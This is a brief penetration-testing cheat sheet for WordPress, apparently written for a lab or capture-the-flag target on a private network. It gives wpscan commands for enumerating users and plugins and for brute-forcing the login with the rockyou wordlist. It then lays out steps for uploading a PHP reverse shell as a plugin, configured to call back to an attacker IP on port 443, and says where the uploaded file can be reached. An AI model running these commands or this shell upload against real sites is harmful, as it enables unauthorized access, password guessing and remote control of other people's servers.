Wordpress commands
==================

**Enumerating users**

wpscan --disable-tls-checks --url https://192.168.1.6:12380/blogblog -e u

**Bruteforce wp login page**

wpscan --disable-tls-checks --url https://192.168.1.6:12380/blogblog -P /usr/share/wordlists/rockyou.txt --usernames john

**Enumerating wordpress users and plugins**

wpscan --disable-tls-checks --url https://192.168.1.30:12380/blogblog/ --plugins-detection aggressive


Reverse shell exploits
======================

**Exploit Method 1**

If the admin login of wordpress is available, upload the famous php-reverse shell.php as plugin.
Download and Edit the following file content

$ip = '192.168.1.28';  // CHANGE THIS
$port = 443;           // CHANGE THIS

Upload the php file. The file will be available in the following location

https://192.168.1.30:12380/blogblog/wp-content/uploads/


